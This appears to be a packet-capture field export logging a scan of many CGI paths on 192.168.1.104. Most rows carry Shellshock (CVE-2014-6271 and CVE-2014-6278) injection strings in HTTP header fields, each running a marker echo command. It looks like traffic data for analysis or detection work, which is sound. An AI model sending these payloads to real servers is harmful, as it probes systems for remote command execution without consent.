http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									442					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/pathtest.pl
																	Keep-Alive										192.168.1.104									444					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php
																	Keep-Alive										192.168.1.104									446					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php4
																	Keep-Alive										192.168.1.104									448					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php5
																	Keep-Alive										192.168.1.104									450					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php-cgi
																	Keep-Alive										192.168.1.104									452					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php.cgi
																	Keep-Alive										192.168.1.104									454					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/php.fcgi
																	Keep-Alive										192.168.1.104									456					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/printenv
																	Keep-Alive										192.168.1.104									458					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/restore_config.cgi
																	Keep-Alive										192.168.1.104									460					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/ruby.rb
																	Keep-Alive										192.168.1.104									462					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/search
																	Keep-Alive										192.168.1.104									464					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/search.cgi
																	Keep-Alive										192.168.1.104									466					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/server.php
																	Keep-Alive										192.168.1.104									468					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/status
																	Keep-Alive										192.168.1.104									470					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/sysinfo.pl
																	Keep-Alive										192.168.1.104									472					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test
																	Keep-Alive										192.168.1.104									474					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test-cgi
																	Keep-Alive										192.168.1.104									476					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test.cgi
																	Keep-Alive										192.168.1.104									478					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test_cgi.php
																	Keep-Alive										192.168.1.104									480					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test.cgi.php
																	Keep-Alive										192.168.1.104									482					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test_cgi.pl
																	Keep-Alive										192.168.1.104									484					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test-cgi.pl
																	Keep-Alive										192.168.1.104									486					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test.py
																	Keep-Alive										192.168.1.104									488					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/test.sh
																	Keep-Alive										192.168.1.104									490					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									492					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/uname.cgi
																	Keep-Alive										192.168.1.104									494					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/viewcvs.cgi
																	Keep-Alive										192.168.1.104									496					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/welcome
																	Keep-Alive										192.168.1.104									498					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/whois.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/whois.cgi
																	Keep-Alive										192.168.1.104									500					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/webcgi/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/webcgi/
																	Keep-Alive										192.168.1.104									502					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/
																	Keep-Alive										192.168.1.104									504					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/admin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/admin.cgi
																	Keep-Alive										192.168.1.104									506					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/administrator.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/administrator.cgi
																	Keep-Alive										192.168.1.104									508					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/authLogin.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/authLogin.cgi
																	Keep-Alive										192.168.1.104									510					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/bb-hist.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/bb-hist.sh
																	Keep-Alive										192.168.1.104									512					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/banner.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/banner.cgi
																	Keep-Alive										192.168.1.104									514					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/book.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/book.cgi
																	Keep-Alive										192.168.1.104									516					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/cgiinfo.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/cgiinfo.cgi
																	Keep-Alive										192.168.1.104									518					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/cgitest.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/cgitest.py
																	Keep-Alive										192.168.1.104									520					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/cgi_wrapper		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/cgi_wrapper
																	Keep-Alive										192.168.1.104									522					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/contact.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/contact.cgi
																	Keep-Alive										192.168.1.104									524					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/count.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/count.cgi
																	Keep-Alive										192.168.1.104									526					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/defaultwebpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/defaultwebpage.cgi
																	Keep-Alive										192.168.1.104									528					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/download.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/download.cgi
																	Keep-Alive										192.168.1.104									530					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/entropysearch.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/entropysearch.cgi
																	Keep-Alive										192.168.1.104									532					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/env.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/env.cgi
																	Keep-Alive										192.168.1.104									534					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/environment.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/environment.cgi
																	Keep-Alive										192.168.1.104									536					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/ezmlm-browse		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/ezmlm-browse
																	Keep-Alive										192.168.1.104									538					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/formmail.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/formmail.cgi
																	Keep-Alive										192.168.1.104									540					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/FormMail-clone.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/FormMail-clone.cgi
																	Keep-Alive										192.168.1.104									542					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/guestbook.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/guestbook.cgi
																	Keep-Alive										192.168.1.104									544					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/helpdesk.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/helpdesk.cgi
																	Keep-Alive										192.168.1.104									546					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/index.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/index.cgi
																	Keep-Alive										192.168.1.104									548					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/index.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/index.php
																	Keep-Alive										192.168.1.104									550					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/index.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/index.pl
																	Keep-Alive										192.168.1.104									552					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/info.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/info.cgi
																	Keep-Alive										192.168.1.104									554					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/info.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/info.sh
																	Keep-Alive										192.168.1.104									556					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/loadpage.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/loadpage.cgi
																	Keep-Alive										192.168.1.104														() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/login.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/login.cgi
																	Keep-Alive										192.168.1.104									564					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/login.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/login.php
																	Keep-Alive										192.168.1.104									566					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/login.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/login.pl
																	Keep-Alive										192.168.1.104									568					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/pathtest.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/pathtest.pl
																	Keep-Alive										192.168.1.104									570					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php
																	Keep-Alive										192.168.1.104									572					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php4		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php4
																	Keep-Alive										192.168.1.104									574					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php5		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php5
																	Keep-Alive										192.168.1.104									576					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php-cgi
																	Keep-Alive										192.168.1.104									578					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php.cgi
																	Keep-Alive										192.168.1.104									580					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/php.fcgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/php.fcgi
																	Keep-Alive										192.168.1.104									582					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/printenv		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/printenv
																	Keep-Alive										192.168.1.104									584					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/restore_config.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/restore_config.cgi
																	Keep-Alive										192.168.1.104									586					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/ruby.rb		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/ruby.rb
																	Keep-Alive										192.168.1.104									588					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/search		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/search
																	Keep-Alive										192.168.1.104									590					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/search.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/search.cgi
																	Keep-Alive										192.168.1.104									592					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/server.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/server.php
																	Keep-Alive										192.168.1.104									594					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/status		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/status
																	Keep-Alive										192.168.1.104									596					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/sysinfo.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/sysinfo.pl
																	Keep-Alive										192.168.1.104									598					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test
																	Keep-Alive										192.168.1.104									600					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test-cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test-cgi
																	Keep-Alive										192.168.1.104									602					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test.cgi
																	Keep-Alive										192.168.1.104									604					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test_cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test_cgi.php
																	Keep-Alive										192.168.1.104									605					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test.cgi.php		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test.cgi.php
																	Keep-Alive										192.168.1.104									607					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test_cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test_cgi.pl
																	Keep-Alive										192.168.1.104									609					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test-cgi.pl		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test-cgi.pl
																	Keep-Alive										192.168.1.104									611					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test.py		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test.py
																	Keep-Alive										192.168.1.104									612					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/test.sh		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/test.sh
																	Keep-Alive										192.168.1.104									614					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/tmUnblock.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/tmUnblock.cgi
																	Keep-Alive										192.168.1.104									616					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/uname.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/uname.cgi
																	Keep-Alive										192.168.1.104									618					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/viewcvs.cgi		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/viewcvs.cgi
																	Keep-Alive										192.168.1.104									619					() { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }	1	http://192.168.1.104/web/cgi-914/welcome		GET				HTTP/1.1																			() { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;				/web/cgi-914/welcome
